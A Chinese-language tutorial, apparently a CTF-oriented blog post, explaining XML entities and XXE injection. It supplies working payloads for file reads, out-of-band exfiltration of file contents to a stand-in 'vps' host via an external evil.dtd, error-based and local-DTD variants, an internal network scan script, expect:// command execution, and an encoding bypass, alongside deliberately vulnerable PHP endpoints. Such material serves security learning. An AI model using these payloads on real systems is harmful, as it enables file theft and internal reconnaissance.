<p>例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">   <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">source-text</span> <span class="hljs-string">&quot;tutorialspoint&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>   &amp;source-text;<br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>参数实体</strong></p>
<p>例如</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ename</span> <span class="hljs-string">&quot;entity_value&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p>
<h3 id="内部实体与外部实体"><a href="#内部实体与外部实体" class="headerlink" title="内部实体与外部实体"></a>内部实体与外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体。</p>
<p>内部实体：<br><code>&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</code></p>
<p>外部实体：<br><code>&lt;!ENTITY name SYSTEM &quot;URI/URL&quot;&gt;</code></p>
<h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p>
<p>通用实体：<br>用<code>&amp;实体名;</code>引用的实体，他在<code>DTD</code>中定义，在<code>XML</code>文档中引用</p>
<p>参数实体：<br>使用<code>% 实体名</code>在<code>DTD</code>中定义，并且只能在<code>DTD</code>中使用<code>%实体名;</code>引用<br>只有在<code>DTD</code>文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
<h3 id="不同程序支持的协议"><a href="#不同程序支持的协议" class="headerlink" title="不同程序支持的协议"></a>不同程序支持的协议</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-4.png"></p>
<blockquote>
<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7 update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p>
</blockquote>
<p>PHP支持的协议会更多一些，但需要一定的扩展：</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-9.png"></p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE漏洞全称<code>XML External Entity Injection</code>即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p>
<h1 id="XXE的几种利用方式"><a href="#XXE的几种利用方式" class="headerlink" title="XXE的几种利用方式"></a>XXE的几种利用方式</h1><h2 id="有回显任意文件读取-Normal-Based-XXE"><a href="#有回显任意文件读取-Normal-Based-XXE" class="headerlink" title="有回显任意文件读取(Normal Based XXE)"></a>有回显任意文件读取(Normal Based XXE)</h2><p>服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p>
<p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-comment">//获取客户端输入内容</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();    <span class="hljs-comment">//初始化XML解析器</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//加载客户端输入的XML内容</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);  <span class="hljs-comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-1.png"></p>
<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><p>如果读取的文件中包含特殊符号，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>等，就会返回一些报错信息</p>
<p>这时可以使用<code>CDATA</code>或者<code>base64 convert</code></p>
<p>术语<code>CDATA</code>指的是不应由<code>XML解析器</code>进行解析的文本数据<code>（Unparsed Character Data）</code><br><code>CDATA</code>部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束，解析器会忽略<code>CDATA</code>部分中的所有内容</p>
<p>我们的思路就是把读取的文件放在CDATA中之后再调用</p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span></span><br><span class="hljs-meta">[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">start</span></span></span><br><span class="hljs-meta"><span class="hljs-meta"><span class="hljs-string">&quot;&lt;![CDATA[&lt;!ENTITY % xxe SYSTEM &quot;</span>file:///flag<span class="hljs-string">&quot;&gt; ]]&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">&gt;</span>]</span><br><span class="hljs-meta">% <span class="hljs-keyword">xxe</span>;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span>&amp;start<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>不过使用这个payload读文件时还是会报错，因为在<code>xml</code>中，<code>xml</code>解析器有个限制：不能在内部<code>Entity</code>中引用，<code>“PEReferences forbidden in internal subset in Entity ”</code>指的就是禁止内部参数实体引用</p>
<p>所以需要调用的外部的<code>dtd</code></p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">go</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span>%dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%go;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-2.png"></p>
<h2 id="无回显任意文件读取-Blind-Based-XXE"><a href="#无回显任意文件读取-Blind-Based-XXE" class="headerlink" title="无回显任意文件读取(Blind Based XXE)"></a>无回显任意文件读取(Blind Based XXE)</h2><p>xxe.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h3><p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;%int;%send;</span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:port?a=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>vps上监听对应的端口</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/xxe/xxe-3.png"></p>
<p>先调用了<code>%remote</code>，请求远程服务器上的<code>evil.dtd</code>，类似php的<code>include</code>，然后<code>%int</code>调用<code>%file</code>，<code>%file</code>获取敏感文件后将结果填入到<code>%send</code>，最后调用<code>%send</code>把我们的读取到的数据发送到我们的远程服务器上，这样就实现了外带数据的效果，要注意实体的值中不能有<code>%</code>, 所以将其转成html实体编码</p>
<h3 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h3><p>以上都是引入外部服务器的<code>OOB XXE（Out-of-band）</code>，虽然好用，但是有一个软肋。当服务器配置好防火墙，禁止服务器请求外网dtd文件的话，就无法接受到数据了。</p>
<p>这时候就可以考虑利用本地dtd来进行XXE</p>
<p>linux</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27;Your DTD code&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure>


<p>windows</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file://C:/Windows/System32/wbem/xml/cim20.dtd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span><br>%local_dtd;<br></code></pre></td></tr></table></figure>

<p>引用内部实体payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamso</span> <span class="hljs-string">&#x27;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;http://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;send;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">    &#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>





<h2 id="基于报错的XXE-Error-Based-XXE"><a href="#基于报错的XXE-Error-Based-XXE" class="headerlink" title="基于报错的XXE(Error Based XXE)"></a>基于报错的XXE(Error Based XXE)</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
<p>出网payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;https://vps/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %remote;</span><br><span class="hljs-meta">    %error;</span><br><span class="hljs-meta">]&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; error SYSTEM &#x27;file:///fakefile/%file;&#x27;&gt;&quot;</span>&gt;</span><br>%start;<br></code></pre></td></tr></table></figure>



<p>不出网如果可以写文件的话就可以构造本地恶意dtd</p>
<p>不出网payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">message</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&#x27;aaa)&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;eval;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &amp;#x25;error;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="hljs-meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span><br><span class="hljs-meta">    %local_dtd;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>flag<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>evil.dtd</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">condition</span> <span class="hljs-string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">pattern</span> (%<span class="hljs-keyword">condition</span>;)&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="探测内网主机与端口"><a href="#探测内网主机与端口" class="headerlink" title="探测内网主机与端口"></a>探测内网主机与端口</h2><p>利用http协议和网页响应时间来判断主机存活</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">XXE</span>(<span class="hljs-params">ip,string</span>):<br>    <span class="hljs-keyword">try</span>:<br>        xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br>        xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br>        x = requests.post(<span class="hljs-string">&#x27;http://192.168.91.134/xml.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="hljs-number">5</span>).text<br>        coded_string = x.split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">2</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [+]&#x27;</span>,ip,<span class="hljs-string">&#x27;Successfully Found !!!&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; [-]&#x27;</span>,ip,<span class="hljs-string">&#x27;Error Not Found !!!&#x27;</span>)<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/xml&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">130</span>,<span class="hljs-number">150</span>):<br>        ip = <span class="hljs-string">&#x27;192.168.91.&#x27;</span> + <span class="hljs-built_in">str</span>(i)<br>        string = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="hljs-string">&#x27;/&#x27;</span><br>        XXE(ip,string)<br></code></pre></td></tr></table></figure>


<p>根据返回内容的不同来判断端口是否开启</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.91.149:80&quot;</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">xxe</span> (<span class="hljs-keyword">#PCDATA</span>) &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xxe</span>&gt;</span>666<span class="hljs-tag">&lt;/<span class="hljs-name">xxe</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>在安装<code>expect</code>扩展的<code>PHP</code>环境里执行系统命令</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>


<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>利用<code>utf-16</code>编码绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://9b6b0b8a-f306-4372-9f2c-60abfae7b4d4.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE convert [</span><br><span class="hljs-string">&lt;!ENTITY % remote SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%remote;%int;%send;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>rep = requests.post(url=url, data=payload)<br><span class="hljs-built_in">print</span>(rep.text)<br></code></pre></td></tr></table></figure>

<p>或者命令转换编码<code>iconv -f utf8 -t UTF-32LE  1.xml &gt; 2.xml</code>，<code>echo urlencode(file_get_contents(&quot;payload.xml&quot;));</code>读</p>
<h2 id="jar-x2F-x2F-文件上传"><a href="#jar-x2F-x2F-文件上传" class="headerlink" title="jar:&#x2F;&#x2F; 文件上传"></a>jar:&#x2F;&#x2F; 文件上传</h2><p><code>Java</code>环境下还可以利用<code>jar</code>协议上传文件</p>
<p><code>jar</code>协议语法，<code>jar:&#123;url&#125;!/&#123;entry&#125;</code>，<code>url</code>是文件的路径，<code>entry</code>是想要解压出来的文件</p>
<p>jar 协议处理文件的过程：<br>1：下载 jar&#x2F;zip 文件到临时文件中<br>2：提取出我们指定的文件<br>3：删除临时文件</p>
<p>payload</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:http://ip:port/1.zip!/1.php&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">convert</span>&gt;</span><span class="hljs-symbol">&amp;remote;</span><span class="hljs-tag">&lt;/<span class="hljs-name">convert</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当<code>1.zip</code>中没有<code>1.php</code>时，<code>java</code>解析器就会报错，说在这个临时文件中找不到这个文件，这样就得到了临时文件的路径，可以利用文件包含等漏洞去进一步利用这个文件，其原理类似于<code>php</code>的<code>phpinfo</code>临时文件包含</p>
